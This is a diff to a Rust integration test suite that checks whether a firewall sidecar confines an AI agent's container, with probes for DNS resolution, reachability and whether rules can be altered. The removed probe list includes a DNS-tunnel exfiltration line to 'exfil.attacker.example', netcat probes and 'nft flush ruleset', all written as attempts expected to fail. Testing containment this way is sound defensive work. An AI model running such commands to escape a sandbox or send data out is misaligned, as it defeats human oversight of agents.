@@ -14,7 +14,7 @@ use std::process::Command;
 
 use hq::compose::{AGENT_WRITABLE, NamedVolume, Plan, UserIds, generate, project_name};
 use hq::harness::Role;
-use hq::perimeter::{Sources, compute};
+use hq::perimeter::{Sources, compute, probes};
 
 const FIREWALL_IMAGE: &str = "hq/firewall:test";
 const SLOT: &str = "fwlive";
@@ -90,7 +90,7 @@ fn live_the_firewall_holds() {
         project_services: Some(
             serde_yaml_ng::from_str("neighbour:\n  image: nginx:alpine\n").unwrap(),
         ),
-        project_networks: Vec::new(),
+        project_networks: None,
     };
 
     let file = dir.path().join("mission.yml");
@@ -108,84 +108,33 @@ fn live_the_firewall_holds() {
         String::from_utf8_lossy(&up.stderr)
     );
 
-    let checks: &[(&str, bool, &str)] = &[
-        // what it must still be able to do
-        (
-            "an allowed name resolves",
-            true,
-            "nslookup example.com 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
-        ),
-        (
-            "an allowed host is reachable",
-            true,
-            "wget -q -T5 -O /dev/null http://example.com/",
-        ),
-        // rule 3: nothing else resolves, by any route
-        (
-            "an off-list name resolves",
-            false,
-            "nslookup github.com 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
-        ),
-        (
-            "an off-list name resolves via another server",
-            false,
-            "nslookup github.com 1.1.1.1 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
-        ),
-        (
-            "an off-list name resolves over TCP",
-            false,
-            "nslookup -vc github.com 8.8.8.8 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
-        ),
-        (
-            "a DNS tunnel carries data out",
-            false,
-            "nslookup exfil.attacker.example 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
-        ),
-        // rule 5: nothing is open because it is an address rather than a
-        // name. Both of these are reachable from an unconstrained container,
-        // which is what makes them worth probing.
-        (
-            "a forbidden address is reachable by number",
-            false,
-            "nc -z -w3 1.1.1.1 443",
-        ),
-        // rule 1: there is nothing to undo in the agent's container
-        ("the agent can undo the rules", false, "nft flush ruleset"),
-        (
-            "the agent can even read the rules",
-            false,
-            "nft list ruleset | grep -q hqfw",
-        ),
-    ];
-
     let neighbour = address_of(&project, "neighbour");
     println!("the neighbour sits at {neighbour}");
-    let neighbour_probe = format!("nc -z -w3 {neighbour} 80");
+
+    // The battery lives in `hq::perimeter` so that `hq check` runs this very
+    // list and not a copy of it (SPEC 4.1 bis, rule 7). Of the two forbidden
+    // addresses, only the neighbour is hermetic: 1.1.1.1 needs the machine to
+    // have a way out at all, or it goes green for the wrong reason.
+    let checks = probes(
+        ALLOWED,
+        &[("1.1.1.1".to_string(), 443), (neighbour.clone(), 80)],
+    );
 
     let mut failures = Vec::new();
-    let checks: Vec<(&str, bool, &str)> = checks
-        .iter()
-        .copied()
-        .chain(std::iter::once((
-            "an undeclared neighbour is reachable",
-            false,
-            neighbour_probe.as_str(),
-        )))
-        .collect();
-
-    for (what, expected, script) in &checks {
+    for probe in &checks {
         let got = compose(
             &file,
             &project,
-            &["exec", "-T", "agent", "sh", "-c", script],
+            &["exec", "-T", "agent", "sh", "-c", &probe.script],
         )
         .status
         .success();
-        println!("{:<48} {}", what, if got { "reached" } else { "refused" });
-        if got != *expected {
+        println!("{:<52} {}", probe.what, verb(got));
+        if got != probe.expected {
             failures.push(format!(
-                "{what}: expected {}, got {}",
-                verb(*expected),
+                "{}: expected {}, got {}",
+                probe.what,
+                verb(probe.expected),
                 verb(got)
             ));
         }
@@ -231,4 +180,107 @@ fn compose(file: &Path, project: &str, args: &[&str]) -> std::process::Output {
 
 fn down(file: &Path, project: &str) {
     compose(file, project, &["down", "-v", "--timeout", "1"]);
+}
+
+/// The system profile is the one where the sidecar must both fence the agent
+/// in and let it reach what the mission declared. Measured, because a
+/// generated file that lifts is not a generated file that works.
+#[test]
+#[ignore = "builds an image and lifts containers; run by hand"]
+fn live_a_declared_service_is_reachable_and_nothing_else_is() {
+    build_image();
+
+    let dir = tempfile::tempdir().unwrap();
+    let tree = dir.path().join("tree");
+    let mission = dir.path().join("mission");
+    std::fs::create_dir_all(&tree).unwrap();
+    std::fs::create_dir_all(&mission).unwrap();
+    for file in AGENT_WRITABLE {
+        std::fs::write(mission.join(file), "").unwrap();
+    }
+
+    let declared = vec![hq::mission::Service {
+        name: "db".to_string(),
+        reach: vec!["db".to_string()],
+    }];
+    let perimeter = compute(
+        Role::Integrator,
+        &Sources {
+            stack: &[ALLOWED.to_string()],
+            harness: &[],
+            services: &declared,
+            forge: &["github.com".to_string()],
+        },
+    )
+    .unwrap();
+
+    let plan = Plan {
+        slot: "fwlivesys".to_string(),
+        role: Role::Integrator,
+        image: "alpine:3.20".to_string(),
+        firewall_image: FIREWALL_IMAGE.to_string(),
+        user: UserIds { uid: 501, gid: 20 },
+        tree,
+        tree_at: PathBuf::from("/work/tree"),
+        mission_dir: mission,
+        mission_dir_at: PathBuf::from("/work/mission"),
+        credentials: Vec::new(),
+        volumes: Vec::<NamedVolume>::new(),
+        environment: BTreeMap::new(),
+        command: vec!["sleep".to_string(), "600".to_string()],
+        perimeter,
+        project_services: Some(serde_yaml_ng::from_str("db:\n  image: nginx:alpine\n").unwrap()),
+        project_networks: None,
+    };
+
+    let file = dir.path().join("system.yml");
+    std::fs::write(&file, generate(&plan).unwrap()).unwrap();
+    let project = project_name("fwlivesys").unwrap();
+    down(&file, &project);
+    let up = compose(&file, &project, &["up", "-d", "--wait"]);
+    assert!(
+        up.status.success(),
+        "the profile did not come up:\n{}",
+        String::from_utf8_lossy(&up.stderr)
+    );
+
+    let checks: &[(&str, bool, &str)] = &[
+        (
+            "the declared service resolves by its compose name",
+            true,
+            "nslookup db 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
+        ),
+        ("the declared service is reachable", true, "nc -z -w3 db 80"),
+        (
+            "an off-list name still refuses to resolve",
+            false,
+            "nslookup github.com 2>&1 | tail -5 | grep -q 'Address: [0-9]'",
+        ),
+        (
+            "an undeclared address is still refused",
+            false,
+            "nc -z -w3 1.1.1.1 443",
+        ),
+    ];
+
+    let mut failures = Vec::new();
+    for (what, expected, script) in checks {
+        let got = compose(
+            &file,
+            &project,
+            &["exec", "-T", "agent", "sh", "-c", script],
+        )
+        .status
+        .success();
+        println!("{:<52} {}", what, verb(got));
+        if got != *expected {
+            failures.push(format!(
+                "{what}: expected {}, got {}",
+                verb(*expected),
+                verb(got)
+            ));
+        }
+    }
+    down(&file, &project);
+    assert!(failures.is_empty(), "{}", failures.join("\n"));
 }
